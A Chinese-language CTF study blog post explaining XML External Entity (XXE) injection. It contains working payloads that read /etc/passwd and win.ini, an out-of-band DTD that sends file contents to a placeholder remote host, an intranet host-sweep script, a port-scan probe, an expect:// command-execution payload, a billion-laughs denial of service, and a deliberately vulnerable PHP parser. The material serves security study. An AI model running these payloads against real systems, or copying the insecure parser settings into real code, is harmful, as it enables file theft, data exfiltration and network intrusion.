---
title: XXE
layout: categories
date: 2020-04-17
tags: [CTF, XXE]
categories:
- [CTF, XXE]
comments: false
---

# XXE

## 0x01什么是XXE

XXE(XML External Entity Injection) 全称为 XML 外部实体注入,不仅能够注入XML代码,还能注入XML**外部实体**

如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面.

<!-- more -->

## 0x02基础语法

[XML基础语法](https://www.runoob.com/xml/xml-syntax.html)

[XML与DTD](https://www.runoob.com/xml/xml-dtd.html)

[DTD教程](https://www.runoob.com/dtd/dtd-tutorial.html)

## 0x03外部实体

**重点一：**

实体分为两种，内部实体和**外部实体**,实体可以从外部的 dtd 文件中引用，我们看下面的代码：

**示例代码：**

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（**方便永远是安全的敌人**）

当然，还有一种引用方式是使用 引用**公用 DTD** 的方法，语法如下：

```
<!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>
```

这个在我们的攻击中也可以起到和 SYSTEM 一样的作用

**重点二：**

我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）

**1.通用实体**

用 &实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用

**示例代码：**

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE updateProfile [<!ENTITY file SYSTEM "file:///c:/windows/win.ini"> ]> 
<updateProfile>  
    <firstname>Joe</firstname>  
    <lastname>&file;</lastname>  
    ... 
</updateProfile>
```

**2.参数实体：**

(1)使用 `% 实体名`(**这里面空格不能少**) 在 DTD 中定义，并且**只能在 DTD 中使用 %实体名; 引用**
(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体
(3)和通用实体一样，参数实体也可以外部引用

**示例代码：**

```
<!ENTITY % an-element "<!ELEMENT mytag (subtag)>"> 
<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
%an-element; %remote-dtd;
```

**抛转：**

参数实体在我们 Blind XXE 中起到了至关重要的作用

## 0x04利用

### 1、有回显读本地敏感文件(Normal XXE)

**示例代码：**

**xml.php**

```
<?php

    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
    echo $creds;

?>
```

**payload:**

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE creds [  
<!ENTITY goodies SYSTEM "file:///etc/passwd"> ]> 
<creds>&goodies;</creds>
```

### 2、无回显读取本地敏感文件(Blind OOB XXE)

**xml.php**

```
<?php

libxml_disable_entity_loader (false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
?>
```

**test.dtd**

```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://ip:9999?p=%file;'>">
```

**payload：**

```
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://ip/test.dtd">
%remote;%int;%send;
]>
```

**整个调用过程：**

我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 `%`)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。

### 3、HTTP 内网主机探测

我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了

**探测脚本**

```
import requests
import base64

#Origtional XML that the server accepts
#<xml>
#    <stuff>user</stuff>
#</xml>


def build_xml(string):
    xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
    xml = xml + "\r\n" + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
    xml = xml + "\r\n" + """<!ENTITY xxe SYSTEM """ + '"' + string + '"' + """>]>"""
    xml = xml + "\r\n" + """<xml>"""
    xml = xml + "\r\n" + """    <stuff>&xxe;</stuff>"""
    xml = xml + "\r\n" + """</xml>"""
    send_xml(xml)

def send_xml(xml):
    url="存在xxe的url地址"
    headers = {'Content-Type': 'application/xml'}
    x = requests.post(url, data=xml, headers=headers, timeout=5).text
    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
    print coded_string
#   print base64.b64decode(coded_string)
for i in range(1, 255):
    try:
        i = str(i)
        ip = '10.0.0.' + i
        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
        print string
        build_xml(string)
    except:
continue
```

### 4、HTTP 内网主机端口扫描

payload

```
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  
<!ELEMENT data (#PCDATA)>  
]>
<data>4</data>
```

### 5、内网盲注(CTF)

2018 强网杯 Wechat

[2018 强网杯 WP](https://www.anquanke.com/post/id/103213#h2-5)

### 6、文件上传

Java `jar://`协议相关，自行查看Reference

### 7、钓鱼：

利用ftp协议结合CRLF注入向SMTP服务器发送任意命令达到发送任意邮件的给任意人，详情查看Reference

### 8、其他

#### **1.PHP expect RCE**

由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE

**示例代码：**

```
<!DOCTYPE root[<!ENTITY cmd SYSTEM "expect://id">]>
<dir>
<file>&cmd;</file>
</dir>
```

#### **2. 利用 XXE 进行 DOS 攻击**

**示例代码：**

```
<?xml version="1.0"?>
     <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
     <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
     <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
     <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
     <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
     <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
     ]>
     <lolz>&lol9;</lolz>
```

## 0x05总结

XXE在ctf比赛中也算比较常见，最近做题碰到很多的xxe的题目，大多题目难度比较适中，记录系统学习一下

## 0x06Reference

[一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357#toc-24)